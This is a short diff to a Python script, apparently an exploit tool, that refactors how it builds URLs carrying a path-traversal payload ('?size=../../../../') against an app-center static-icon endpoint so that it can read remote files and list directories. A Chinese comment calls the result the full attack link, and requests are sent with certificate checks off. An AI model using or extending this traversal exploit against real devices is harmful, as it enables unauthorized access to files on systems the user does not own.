@@ -9,14 +9,18 @@ from urllib.parse import urljoin, unquote
 PAYLOAD = "/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../"
 
 
+def build_remote_url(base_url, path):
+    """构造远端文件/目录 URL。"""
+    if not path.startswith('/'):
+        path = '/' + path
+    return f"{base_url.rstrip('/')}{PAYLOAD}{path.lstrip('/')}"
+
+
 def get_remote_content(base_url, path):
     """获取指定路径的内容，返回解析后的文件/文件夹列表"""
     # 构造完整攻击链接
     # 注意：path 必须以 / 结尾才能正确列出目录，如果是文件则不需要
-    if not path.startswith('/'):
-        path = '/' + path
-
-    target_url = f"{base_url.rstrip('/')}{PAYLOAD}{path.lstrip('/')}"
+    target_url = build_remote_url(base_url, path)
 
     try:
         resp = requests.get(target_url, verify=False, timeout=10)
